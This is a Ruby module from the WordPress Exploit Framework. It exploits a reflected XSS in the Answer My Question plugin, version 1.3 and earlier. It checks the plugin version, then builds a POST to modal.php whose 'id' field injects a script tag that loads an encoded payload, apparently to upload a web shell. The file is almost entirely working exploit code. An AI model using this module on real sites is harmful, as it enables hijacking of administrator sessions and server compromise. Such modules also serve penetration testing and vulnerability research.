# frozen_string_literal: true

class Wpxf::Exploit::AnswerMyQuestionReflectedXssShellUpload < Wpxf::Module
  include Wpxf::WordPress::StagedReflectedXss

  def initialize
    super

    update_info(
      name: 'Answer My Question <= 1.3 Reflected XSS Shell Upload',
      author: [
        'rastating'  # WPXF module
      ],
      references: [
        ['WPVDB', '8800']
      ],
      date: 'Apr 24 2017'
    )
  end

  def check
    check_plugin_version_from_changelog('answer-my-question', 'readme.txt', '1.4')
  end

  def vulnerable_url
    normalize_uri(wordpress_url_plugins, 'answer-my-question', 'modal.php')
  end

  def initial_script
    create_basic_post_script(
      vulnerable_url,
      'id' => "\\\"><script>#{xss_ascii_encoded_include_script}<\\/script>",
      'posted' => '1',
      'notify' => '',
      'user_email' => Utility::Text.rand_email,
      'subject' => Utility::Text.rand_alpha(10),
      'question' => Utility::Text.rand_alpha(10),
      'answer' => Utility::Text.rand_alpha(10)
    )
  end
end
